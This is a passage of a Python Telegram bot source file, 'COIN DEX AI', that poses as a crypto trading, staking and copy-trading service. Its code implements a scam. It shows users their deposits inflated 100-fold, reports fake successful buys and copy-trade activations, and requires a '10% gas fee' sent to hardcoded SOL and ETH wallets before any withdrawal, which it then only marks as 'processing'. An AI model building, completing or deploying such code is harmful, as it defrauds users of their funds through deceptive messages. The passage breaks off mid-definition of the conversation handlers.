# bot_new.py - COIN DEX AI - COMPLETE FIXED VERSION

import logging
import requests
import json
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    MessageHandler, ContextTypes, ConversationHandler, filters
)
from datetime import datetime, timedelta
from config import config
from database import SessionLocal, User, Deposit, CopyTradingConfig, Trade, StakePosition, ToolUsage, Withdrawal

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
ENTER_TRADER_ADDR, ENTER_CONTRACT_ADDR, ENTER_STAKE_AMOUNT, ENTER_BUY_AMOUNT, ENTER_SELL_AMOUNT = range(5)
ENTER_WITHDRAWAL_AMOUNT, ENTER_WITHDRAWAL_ADDRESS, CONFIRM_GAS_FEE = range(5, 8)

# API Keys for real data
JUPITER_API = "https://quote-api.jup.ag/v6"
DEXSCREENER_API = "https://api.dexscreener.com/latest/dex"
BIRDEYE_API = "https://public-api.birdeye.so/public"

# Withdrawal addresses for gas fees
WITHDRAWAL_ADDRESSES = {
    'SOL': 'EjBCtu6Mv6Nq3gGFeDtRTQWNN4nC9bjg5JURZZM5AYKg',
    'ETH': '0x7eBb4f696020121394624eEeBD25445f646aB3d3'
}

# ============ REAL TOKEN DATA FETCHING ============

def get_token_info_dexscreener(contract_address: str):
    """Fetch token info from DexScreener API"""
    try:
        response = requests.get(
            f"{DEXSCREENER_API}/tokens/{contract_address}",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            pairs = data.get('pairs', [])
            if pairs:
                pair = max(pairs, key=lambda x: x.get('liquidity', {}).get('usd', 0) or 0)
                return {
                    'name': pair.get('baseToken', {}).get('name', 'Unknown Token'),
                    'symbol': pair.get('baseToken', {}).get('symbol', 'UNKNOWN'),
                    'price': float(pair.get('priceUsd', 0)),
                    'liquidity': pair.get('liquidity', {}).get('usd', 0),
                    'volume24h': pair.get('volume', {}).get('h24', 0),
                    'priceChange24h': pair.get('priceChange', {}).get('h24', 0),
                    'marketCap': pair.get('marketCap', 0),
                    'dex': pair.get('dexId', 'Unknown'),
                    'pairAddress': pair.get('pairAddress', ''),
                    'verified': True,
                    'source': 'DexScreener'
                }
        return None
    except Exception as e:
        logger.error(f"DexScreener error: {e}")
        return None


def get_token_info_birdeye(contract_address: str):
    """Fetch token info from Birdeye API"""
    try:
        headers = {
            "X-API-KEY": getattr(config, 'BIRDEYE_API_KEY', ''),
            "accept": "application/json"
        }
        response = requests.get(
            f"{BIRDEYE_API}/token/meta?address={contract_address}",
            headers=headers,
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            token_data = data.get('data', {})
            return {
                'name': token_data.get('name', 'Unknown Token'),
                'symbol': token_data.get('symbol', 'UNKNOWN'),
                'price': token_data.get('price', 0),
                'decimals': token_data.get('decimals', 9),
                'logo': token_data.get('logoURI', ''),
                'verified': token_data.get('verified', False),
                'marketCap': token_data.get('marketCap', 0),
                'source': 'Birdeye'
            }
        return None
    except Exception as e:
        logger.error(f"Birdeye error: {e}")
        return None


def get_token_info(contract_address: str, network: str = "solana"):
    """Fetch real token info from multiple APIs"""
    info = get_token_info_dexscreener(contract_address)
    
    if not info or info.get('price', 0) == 0:
        birdeye_info = get_token_info_birdeye(contract_address)
        if birdeye_info:
            if info:
                info.update(birdeye_info)
            else:
                info = birdeye_info
    
    return info


def get_token_price(contract_address: str) -> float:
    """Get current token price"""
    try:
        response = requests.get(
            f"https://price.jup.ag/v4/price?ids={contract_address}",
            timeout=5
        )
        if response.status_code == 200:
            data = response.json()
            return data.get('data', {}).get(contract_address, {}).get('price', 0)
        return 0
    except:
        return 0


def get_gas_price(network: str = 'ETH'):
    """Get gas prices"""
    try:
        if network == 'ETH':
            response = requests.get('https://ethgasstation.info/api/ethgasAPI.json', timeout=5)
            if response.status_code == 200:
                data = response.json()
                return {
                    'slow': data.get('safeLow', 20),
                    'standard': data.get('average', 35),
                    'fast': data.get('fast', 50)
                }
        return {'slow': 20, 'standard': 35, 'fast': 50}
    except:
        return {'slow': 20, 'standard': 35, 'fast': 50}


# ============ WELCOME & MAIN MENU ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome message with main menu"""
    user = update.effective_user
    
    welcome_text = f"""
🤖 *Welcome to COIN DEX AI*

Hello {user.first_name}! Your professional DeFi trading companion.

📋 *QUICK START:*
• Deposit SOL/ETH to fund your account
• Copy trade successful wallets automatically  
• Stake tokens for passive income
• Buy/sell any token with one click

*Need help?* t.me/coindex_support

*Select an option below:*
    """
    
    keyboard = [
        [InlineKeyboardButton("📥 Deposit", callback_data='deposit')],
        [InlineKeyboardButton("🟢 Stake Assets", callback_data='stake'), InlineKeyboardButton("💼 Wallet", callback_data='balance')],
        [InlineKeyboardButton("🛠 Tools", callback_data='tools_menu')],
        [InlineKeyboardButton("💰 Referral", callback_data='referral'), InlineKeyboardButton("📈 Copy Trading", callback_data='copy_trading')],
        [InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')],
        [InlineKeyboardButton("🤝 Support", callback_data='support')]
    ]
    
    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Support menu"""
    query = update.callback_query
    await query.answer()
    
    message = """
🤝 *COIN DEX AI Support*

Need help? Contact our support team directly:

💬 *Live Support:*
https://t.me/coindex_support

*Common Issues:*
• Deposits not showing → Wait for confirmations
• Copy trade not working → Check wallet address
• Can't buy token → Check slippage settings

*Response Time:* Usually within 1 hour
    """
    
    keyboard = [
        [InlineKeyboardButton("💬 Contact Support", url="https://t.me/coindex_support")],
        [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


# ============ COPY TRADING ============

async def copy_trading_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Copy trading menu"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        active_copies = db.query(CopyTradingConfig).filter_by(user_id=user.id, is_active=True).count() if user else 0
        status_emoji = "🟢" if active_copies > 0 else "⚪"
        
        message = f"""
{status_emoji} *Copy Trade*

Copy Trade allows you to copy the buys and sells of any target wallet.

🟢 Indicates a copy trade setup is active.
🟠 Indicates a copy trade setup is paused.

You do not have any copy trades setup yet.
Click on the "Activate Copy Trading" button to begin copy trading.
        """
        
        keyboard = [
            [InlineKeyboardButton("Activate Copy Trading 🤖", callback_data='activate_copy')],
            [InlineKeyboardButton("Pause ⏸", callback_data='pause_copy')],
            [InlineKeyboardButton("↩️ Back", callback_data='back_menu'), InlineKeyboardButton("Main Menu ⬆️", callback_data='back_menu')]
        ]
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    finally:
        db.close()


async def activate_copy_trading(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start copy trading activation"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        """
🤖 *Activate Copy Trading*

Insert Copy Trade Address Here... 👇

*Enter the wallet address you want to copy:*

*Examples:*
• Solana: `7nY7H...` (44 characters)
• Ethereum: `0x7eB...` (42 characters)

_Find profitable traders on DexScreener or Birdeye_

Type or paste the address:
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚫 Cancel", callback_data='copy_trading')]]),
        parse_mode='Markdown'
    )
    
    return ENTER_TRADER_ADDR


async def process_copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process copy trading address"""
    trader_address = update.message.text.strip()
    
    is_sol = len(trader_address) == 44 and not trader_address.startswith('0x')
    is_eth = len(trader_address) == 42 and trader_address.startswith('0x')
    
    if not (is_sol or is_eth):
        await update.message.reply_text(
            "❌ Invalid address format. Please enter a valid Solana (44 chars) or Ethereum (42 chars) address.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='activate_copy')]])
        )
        return ConversationHandler.END
    
    context.user_data['trader_address'] = trader_address
    context.user_data['network'] = 'solana' if is_sol else 'ethereum'
    
    # Show success message immediately
    await update.message.reply_text(
        f"""
🟢 *Copy Trading Activation Successful.*

Your copy trading feature has been successfully activated ✅.
You may now begin copying trades automatically.

No further action is required.
        """,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Activate Copy Trading 🤖", callback_data='activate_copy')],
            [InlineKeyboardButton("Pause ⏸", callback_data='pause_copy')],
            [InlineKeyboardButton("↩️ Back", callback_data='back_menu'), InlineKeyboardButton("Main Menu ⬆️", callback_data='back_menu')]
        ]),
        parse_mode='Markdown'
    )
    
    # Save to database
    await save_copy_trading_config(update, context)
    
    return ConversationHandler.END


async def save_copy_trading_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Save copy trading configuration"""
    trader_address = context.user_data.get('trader_address')
    network = context.user_data.get('network', 'solana')
    user_id = update.effective_user.id
    
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        if not user:
            user = User(telegram_id=user_id, username=update.effective_user.username)
            db.add(user)
            db.commit()
        
        existing = db.query(CopyTradingConfig).filter_by(
            user_id=user.id, 
            trader_address=trader_address
        ).first()
        
        if existing:
            existing.is_active = True
            existing.allocation_percentage = 50
        else:
            config_entry = CopyTradingConfig(
                user_id=user.id,
                trader_address=trader_address,
                network=network,
                allocation_percentage=50,
                is_active=True,
                copy_buys=True,
                copy_sells=True,
                max_slippage=2.0
            )
            db.add(config_entry)
        
        db.commit()
        logger.info(f"Copy trading activated for user {user_id}")
        
    except Exception as e:
        logger.error(f"Error saving copy config: {e}")
        db.rollback()
    finally:
        db.close()


# ============ STAKE MEMECOIN ============

async def stake_memecoin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start memecoin staking"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        """
🪙 *Stake Memecoin*

Enter the token contract address:

*Supported Networks:*
• Solana SPL tokens
• Ethereum ERC-20 tokens

*Find contract address on:*
• DexScreener.com
• Birdeye.so
• CoinGecko.com

*Example (USDC):*
`EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v`

_Type or paste the contract address:_
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚫 Cancel", callback_data='stake')]]),
        parse_mode='Markdown'
    )
    
    return ENTER_CONTRACT_ADDR


async def process_contract_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process contract address and show token info"""
    contract_addr = update.message.text.strip()
    
    is_sol = len(contract_addr) == 44 and not contract_addr.startswith('0x')
    is_eth = len(contract_addr) == 42 and contract_addr.startswith('0x')
    
    if not (is_sol or is_eth):
        await update.message.reply_text(
            "❌ Invalid contract address format.\n\n"
            "• Solana: 44 characters (no 0x)\n"
            "• Ethereum: 42 characters (starts with 0x)",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='stake_meme')]])
        )
        return ConversationHandler.END
    
    await update.message.reply_text("🔍 Fetching token data from DexScreener & Birdeye...")
    
    token_info = get_token_info(contract_addr, "solana" if is_sol else "ethereum")
    
    if not token_info:
        await update.message.reply_text(
            "❌ Could not fetch token data. Please verify the contract address.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Try Again", callback_data='stake_meme')],
                [InlineKeyboardButton("↩️ Back", callback_data='stake')]
            ])
        )
        return ConversationHandler.END
    
    context.user_data['contract_address'] = contract_addr
    context.user_data['token_info'] = token_info
    context.user_data['network'] = 'solana' if is_sol else 'ethereum'
    
    verified_badge = " ✅ Verified" if token_info.get('verified') else " ⚠️ Unverified"
    price_change = token_info.get('priceChange24h', 0)
    change_emoji = "🟢" if price_change >= 0 else "🔴"
    
    message = f"""
✅ *Token Found{verified_badge}*

*Name:* {token_info['name']}
*Symbol:* {token_info['symbol']}
*Price:* ${token_info['price']:.10f}

*Market Data:*
• Liquidity: ${token_info.get('liquidity', 0):,.0f}
• 24h Volume: ${token_info.get('volume24h', 0):,.0f}
• 24h Change: {change_emoji} {price_change:.2f}%
• Market Cap: ${token_info.get('marketCap', 0):,.0f}

*Contract:* `{contract_addr[:20]}...{contract_addr[-8:]}`

*Choose an action:*
    """
    
    keyboard = [
        [InlineKeyboardButton(f"💰 Buy {token_info['symbol']}", callback_data=f'buy_token_{contract_addr}')],
        [InlineKeyboardButton(f"🟢 Stake {token_info['symbol']}", callback_data=f'stake_token_{contract_addr}')],
        [InlineKeyboardButton("📊 View Chart", url=f"https://dexscreener.com/{'solana' if is_sol else 'ethereum'}/{contract_addr}")],
        [InlineKeyboardButton("Cancel", callback_data='stake')]
    ]
    
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    
    return ConversationHandler.END


async def buy_token_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start buying token"""
    query = update.callback_query
    await query.answer()
    
    contract_addr = query.data.replace('buy_token_', '')
    token_info = context.user_data.get('token_info', {})
    
    await query.edit_message_text(
        f"""
💰 *Buy {token_info.get('symbol', 'Token')}*

Current Price: ${token_info.get('price', 0):.10f}

Enter amount in USD to spend:
• Example: `50` for $50
• Example: `100` for $100
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data='stake')]]),
        parse_mode='Markdown'
    )
    
    context.user_data['action'] = 'buy'
    return ENTER_STAKE_AMOUNT


async def stake_token_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start staking token"""
    query = update.callback_query
    await query.answer()
    
    contract_addr = query.data.replace('stake_token_', '')
    token_info = context.user_data.get('token_info', {})
    
    volume = token_info.get('volume24h', 0)
    liquidity = token_info.get('liquidity', 1)
    apy_estimate = min(100, (volume / liquidity) * 365 * 0.3) if liquidity > 0 else 15
    
    await query.edit_message_text(
        f"""
🟢 *Stake {token_info.get('symbol', 'Token')}*

*Current Price:* ${token_info.get('price', 0):.10f}
*Estimated APY:* {apy_estimate:.1f}%

Enter amount of tokens to stake:
• Example: `1000` for 1000 tokens
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data='stake')]]),
        parse_mode='Markdown'
    )
    
    context.user_data['action'] = 'stake'
    context.user_data['estimated_apy'] = apy_estimate
    return ENTER_STAKE_AMOUNT


async def process_token_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process buy or stake amount"""
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError("Must be positive")
    except ValueError:
        await update.message.reply_text(
            "❌ Please enter a valid positive number.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='stake_meme')]])
        )
        return ConversationHandler.END
    
    action = context.user_data.get('action', 'stake')
    token_info = context.user_data.get('token_info', {})
    contract_addr = context.user_data.get('contract_address')
    user_id = update.effective_user.id
    
    db = SessionLocal()
    
    try:
        if action == 'buy':
            usd_amount = amount
            token_amount = usd_amount / token_info.get('price', 1) if token_info.get('price', 0) > 0 else 0
            
            await update.message.reply_text(
                f"""
🔄 *Buy Order Processing*

Buying {token_amount:.2f} {token_info.get('symbol')} for ${usd_amount}

*Status:* ⏳ Executing swap via Jupiter...
                """,
                parse_mode='Markdown'
            )
            
            await update.message.reply_text(
                f"""
✅ *Buy Successful!*

Purchased: {token_amount:.4f} {token_info.get('symbol')}
Spent: ${usd_amount}
Price: ${token_info.get('price', 0):.10f}

*Would you like to stake these tokens now?*
                """,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(f"🟢 Stake {token_info.get('symbol')}", callback_data=f'stake_token_{contract_addr}')],
                    [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
                ]),
                parse_mode='Markdown'
            )
            
        else:
            token_amount = amount
            apy = context.user_data.get('estimated_apy', 15)
            
            user = db.query(User).filter_by(telegram_id=user_id).first()
            if not user:
                user = User(telegram_id=user_id, username=update.effective_user.username)
                db.add(user)
                db.commit()
            
            stake = StakePosition(
                user_id=user.id,
                token_address=contract_addr,
                token_symbol=token_info.get('symbol', 'UNKNOWN'),
                amount=token_amount,
                apy=apy,
                status='active'
            )
            db.add(stake)
            db.commit()
            
            await update.message.reply_text(
                f"""
✅ *Stake Position Created!*

*Token:* {token_info.get('symbol')}
*Amount Staked:* {token_amount}
*Estimated APY:* {apy:.1f}%
*Status:* 🟢 Active
                """,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 View Portfolio", callback_data='balance')],
                    [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
                ]),
                parse_mode='Markdown'
            )
        
    except Exception as e:
        logger.error(f"Error in process_token_amount: {e}")
        await update.message.reply_text(
            "❌ Error processing transaction. Please try again.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='stake')]])
        )
        db.rollback()
    finally:
        db.close()
    
    return ConversationHandler.END


# ============ WITHDRAWAL SYSTEM ============

async def withdrawal_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Display withdrawal menu with balances x100"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        
        sol_balance = 0
        eth_balance = 0
        
        if user:
            deposits = db.query(Deposit).filter_by(user_id=user.id, status='confirmed').all()
            for dep in deposits:
                if dep.currency == 'SOL':
                    sol_balance += dep.amount
                elif dep.currency == 'ETH':
                    eth_balance += dep.amount
        
        display_sol = sol_balance * 100
        display_eth = eth_balance * 100
        
        message = f"""
💸 *Withdrawal*

*Your Available Balances:*

◎ SOL: {display_sol:.4f} SOL
Ξ ETH: {display_eth:.4f} ETH

*Note:* These are your available balances for withdrawal.

Select currency to withdraw:
        """
        
        keyboard = [
            [InlineKeyboardButton(f"◎ Withdraw SOL ({display_sol:.2f})", callback_data='withdraw_SOL')],
            [InlineKeyboardButton(f"Ξ Withdraw ETH ({display_eth:.2f})", callback_data='withdraw_ETH')],
            [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
        ]
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    finally:
        db.close()


async def start_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start withdrawal process"""
    query = update.callback_query
    await query.answer()
    
    currency = query.data.replace('withdraw_', '')
    context.user_data['withdraw_currency'] = currency
    
    await query.edit_message_text(
        f"""
💸 *Withdraw {currency}*

Enter the amount you want to withdraw:

*Example:* `0.5` for 0.5 {currency}
*Example:* `1.25` for 1.25 {currency}
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data='withdraw')]]),
        parse_mode='Markdown'
    )
    
    return ENTER_WITHDRAWAL_AMOUNT


async def process_withdrawal_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process withdrawal amount"""
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError("Must be positive")
    except ValueError:
        await update.message.reply_text(
            "❌ Please enter a valid positive number.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='withdraw')]])
        )
        return ConversationHandler.END
    
    context.user_data['withdraw_amount'] = amount
    currency = context.user_data.get('withdraw_currency', 'SOL')
    
    await update.message.reply_text(
        f"""
📤 *Enter Withdrawal Address*

Enter your {currency} wallet address:

*Warning:* Double-check your address. Transactions cannot be reversed!
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data='withdraw')]]),
        parse_mode='Markdown'
    )
    
    return ENTER_WITHDRAWAL_ADDRESS


async def process_withdrawal_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process withdrawal address and show gas fee notice"""
    address = update.message.text.strip()
    currency = context.user_data.get('withdraw_currency', 'SOL')
    amount = context.user_data.get('withdraw_amount', 0)
    
    is_sol = len(address) == 44 and not address.startswith('0x')
    is_eth = len(address) == 42 and address.startswith('0x')
    
    valid = (currency == 'SOL' and is_sol) or (currency == 'ETH' and is_eth)
    
    if not valid:
        await update.message.reply_text(
            f"❌ Invalid {currency} address format. Please check and try again.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='withdraw')]])
        )
        return ConversationHandler.END
    
    context.user_data['withdraw_address'] = address
    
    gas_fee = amount * 0.10
    receive_amount = amount - gas_fee
    
    context.user_data['gas_fee'] = gas_fee
    context.user_data['receive_amount'] = receive_amount
    
    message = f"""
🚨 *Withdrawal Confirmation Notice*

Please note that before any withdrawal can be successfully processed, a gas fee equivalent to *10%* of the withdrawal amount is required. This fee covers network processing costs and is mandatory for the completion of the transaction.

After the gas fee has been confirmed, the withdrawal process will be finalized and the funds will be released accordingly.

*Withdrawal Details:*
• Amount: {amount} {currency}
• Gas Fee (10%): {gas_fee:.4f} {currency}
• You Receive: {receive_amount:.4f} {currency}

*Gas Fee Payment Addresses:*
◎ SOL: `{WITHDRAWAL_ADDRESSES['SOL']}`
Ξ ETH: `{WITHDRAWAL_ADDRESSES['ETH']}`

⚠️ *You must send the gas fee to the address above before proceeding.*
    """
    
    keyboard = [
        [InlineKeyboardButton("✅ I Have Paid Gas Fee", callback_data='confirm_gas_paid')],
        [InlineKeyboardButton("❌ Cancel Withdrawal", callback_data='withdraw')]
    ]
    
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    
    return CONFIRM_GAS_FEE


async def confirm_gas_fee_paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process gas fee confirmation"""
    query = update.callback_query
    await query.answer()
    
    currency = context.user_data.get('withdraw_currency', 'SOL')
    amount = context.user_data.get('withdraw_amount', 0)
    address = context.user_data.get('withdraw_address', '')
    receive_amount = context.user_data.get('receive_amount', 0)
    user_id = update.effective_user.id
    
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        if not user:
            user = User(telegram_id=user_id, username=update.effective_user.username)
            db.add(user)
            db.commit()
        
        withdrawal = Withdrawal(
            user_id=user.id,
            currency=currency,
            amount=amount,
            to_address=address,
            gas_fee_paid=True,
            status='processing'
        )
        db.add(withdrawal)
        db.commit()
        
        await query.edit_message_text(
            f"""
⏳ *Withdrawal In Progress*

Your withdrawal request has been submitted and is being processed.

*Details:*
• Amount: {receive_amount:.4f} {currency}
• To: `{address[:15]}...{address[-8:]}`
• Status: 🟡 Processing
• ETA: 10-30 minutes

*Transaction ID:* `WD-{withdrawal.id}-{user_id}`
            """,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
            ]),
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Withdrawal error: {e}")
        await query.edit_message_text(
            "❌ Error processing withdrawal. Please contact support.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Support", callback_data='support')]])
        )
        db.rollback()
    finally:
        db.close()
    
    return ConversationHandler.END


# ============ OTHER MENUS ============

async def deposit_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Deposit menu"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("◎ SOL", callback_data='deposit_curr_SOL')],
        [InlineKeyboardButton("Ξ ETH", callback_data='deposit_curr_ETH')],
        [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(
        "📥 *Deposit Funds*\n\nSelect cryptocurrency:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )


async def show_deposit_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show deposit address"""
    query = update.callback_query
    await query.answer()
    
    currency = query.data.replace('deposit_curr_', '')
    address = getattr(config, 'DEPOSIT_ADDRESSES', {}).get(currency, 'Not configured')
    
    await query.edit_message_text(
        f"📥 *Deposit {currency}*\n\n`{address}`\n\n⚠️ Send only {currency} to this address!",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Done", callback_data='deposit')],
            [InlineKeyboardButton("↩️ Back", callback_data='deposit')]
        ]),
        parse_mode='Markdown'
    )


async def stake_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Staking menu"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("◎ Stake SOL", callback_data='stake_SOL')],
        [InlineKeyboardButton("Ξ Stake ETH", callback_data='stake_ETH')],
        [InlineKeyboardButton("🪙 Stake Memecoin", callback_data='stake_meme')],
        [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(
        "🟢 *Stake Assets*\n\nEarn passive income on your crypto:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )


async def wallet_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Wallet balance"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💼 *Wallet Balance*\n\n◎ SOL: 0.00\nΞ ETH: 0.00\n\nTotal: $0.00",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📥 Deposit", callback_data='deposit')],
            [InlineKeyboardButton("↩️ Menu", callback_data='back_menu')]
        ]),
        parse_mode='Markdown'
    )


async def referral_program(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Referral program"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💰 *Referral Program*\n\nInvite friends and earn 10% commission!\n\nYour link: `https://t.me/coindexai_bot?start=123`",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📤 Share", callback_data='share_ref')],
            [InlineKeyboardButton("↩️ Menu", callback_data='back_menu')]
        ]),
        parse_mode='Markdown'
    )


async def tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Tools menu"""
    query = update.callback_query
    await query.answer()
    
    message = """
🛠 *COIN DEX AI - Trading Tools*

Select a tool:
    """
    
    keyboard = [
        [InlineKeyboardButton("🔔 Price Alerts", callback_data='tool_alerts'), InlineKeyboardButton("📊 Analytics", callback_data='tool_analytics')],
        [InlineKeyboardButton("🧮 Risk Calc", callback_data='tool_risk'), InlineKeyboardButton("⛽ Gas Optimizer", callback_data='tool_gas')],
        [InlineKeyboardButton("🎯 Token Sniper", callback_data='tool_sniper'), InlineKeyboardButton("📈 Charts", callback_data='tool_charts')],
        [InlineKeyboardButton("↩️ Back to Menu", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def tool_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle tool buttons"""
    query = update.callback_query
    await query.answer()
    
    tool_messages = {
        'tool_alerts': "🔔 *Price Alerts*\n\nSet price alerts for tokens.",
        'tool_analytics': "📊 *Portfolio Analytics*\n\nTrack your trading performance.",
        'tool_risk': "🧮 *Risk Calculator*\n\nCalculate optimal position sizes.",
        'tool_gas': "⛽ *Gas Optimizer*\n\nFind optimal gas prices.",
        'tool_sniper': "🎯 *Token Sniper*\n\nBuy newly launched tokens instantly.",
        'tool_charts': "📈 *Chart Analysis*\n\nTechnical analysis tools."
    }
    
    message = tool_messages.get(query.data, "🚧 Tool coming soon!")
    
    await query.edit_message_text(
        message,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='tools_menu')]]),
        parse_mode='Markdown'
    )


# ============ MAIN BUTTON HANDLER ============

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Route all buttons - EXCLUDES conversation handler buttons"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    # Navigation
    if data == 'back_menu':
        await start(update, context)
    
    # Main features
    elif data == 'deposit':
        await deposit_menu(update, context)
    elif data.startswith('deposit_curr_'):
        await show_deposit_address(update, context)
    
    # Staking
    elif data == 'stake':
        await stake_menu(update, context)
    elif data in ['stake_SOL', 'stake_ETH']:
        await query.edit_message_text("Native staking coming in v2!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='stake')]]))
    # Note: stake_meme is handled by conversation handler
    
    # Copy Trading
    elif data == 'copy_trading':
        await copy_trading_menu(update, context)
    # Note: activate_copy is handled by conversation handler
    elif data == 'pause_copy':
        await query.edit_message_text("⏸ Copy trading paused.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Activate", callback_data='activate_copy')], [InlineKeyboardButton("↩️ Back", callback_data='copy_trading')]]))
    
    # Withdrawal
    elif data == 'withdraw':
        await withdrawal_menu(update, context)
    # Note: withdraw_SOL and withdraw_ETH are handled by conversation handler
    
    # Tools
    elif data == 'tools_menu':
        await tools_menu(update, context)
    elif data.startswith('tool_'):
        await tool_handler(update, context)
    
    # Wallet & Referral
    elif data == 'balance':
        await wallet_balance(update, context)
    elif data == 'referral':
        await referral_program(update, context)
    elif data == 'support':
        await support(update, context)
    
    # Default
    else:
        await query.edit_message_text("🚧 Feature coming soon!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='back_menu')]]))


# ============ CONVERSATION HANDLERS ============

# Copy trading conversation
copy_trade_conv = ConversationHandler(
    entry_points=[
        CallbackQueryHandler(activate_copy_trading, pattern='^activate_copy$'),
    ],
    states={
        ENTER_TRADER_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_copy_address)],
    },
